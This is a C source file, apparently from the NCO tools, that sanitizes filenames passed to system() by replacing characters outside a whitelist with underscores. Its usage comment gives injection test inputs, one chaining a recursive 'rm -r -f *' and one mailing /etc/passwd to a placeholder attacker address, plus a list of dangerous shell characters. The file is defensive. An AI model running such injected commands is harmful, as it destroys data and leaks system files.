/* Purpose: Sanitize user-input data passed to system() calls

   cc -o ${MY_BIN_DIR}/sanitize ~/sw/c/sanitize.c

   Usage:
   sanitize in.nc
   sanitize 'in.nc;'
   sanitize '/path/to/in.nc;/bin/rm -r -f *'
   sanitize '/path/to/in.nc;cat /etc/passwd | mail hacker@badguy.net'
   sanitize '/path/to/in.nc; blacklist: ;|<>[](),*' */

#include <stdio.h> /* stderr, FILE, NULL, etc. */
#include <stdlib.h> /* atof, atoi, malloc, getopt */
#include <string.h> /* strcmp() */
#include <getopt.h>

int main(int argc,char *argv[]){
  
/* Whitelist algorithm based on:
   https://wiki.sei.cmu.edu/confluence/display/c/STR02-C.+Sanitize+data+passed+to+complex+subsystems 
   NCO modifications to whitelist:
   20180214: Allow colons (WRF filenames sometimes have timestamps with colons, Windows drive labels have colons) 
   20180214: Allow spaces? (Methinks some Windows people do have data files with spaces)
   20180214: Allow forward slash on UNIX, backslash on Windows (path separators) 
   Crucial characters that are implicitly blacklisted (and could be transformed into underscores) are:
   ";|<>[](),*" */
  static char wht_lst[]="abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "1234567890_-.@"
    " :"
#ifndef _MSC_VER
    "/";
#else /* !_MSC_VER */
    "\";
#endif /* !_MSC_VER */
  /* ": re-balance syntax highlighting */
  char *fl_in=NULL; /* [sng] Input file */
  char *fl_out=NULL; /* [sng] Output file */

  /* Process positional arguments */
  if(optind < argc){
    int psn_arg_nbr=argc-optind;
    if(psn_arg_nbr > 2){
      (void)fprintf(stdout,"ERROR too many positional arguments\n");
      exit(EXIT_FAILURE);
    }else if(psn_arg_nbr == 1){
      fl_out=(char *)strdup(argv[optind++]);
    }else if(psn_arg_nbr == 2){
      fl_in=(char *)strdup(argv[optind++]);
      fl_out=(char *)strdup(argv[optind++]);
    } /* end else */
  } /* end if */

  if(fl_out){
    char *usr_dta=fl_out;
    char *cp=usr_dta; /* Cursor into string */

    (void)fprintf(stderr,"usr_dta = %s\n",usr_dta);

    const char *sng_end=usr_dta+strlen(usr_dta);
    for(cp+=strspn(cp,wht_lst);cp!=sng_end;cp+=strspn(cp,wht_lst)) *cp='_';

    (void)fprintf(stderr,"usr_dta = %s\n",usr_dta);
  } /* !fl_out */

  return EXIT_SUCCESS;
}
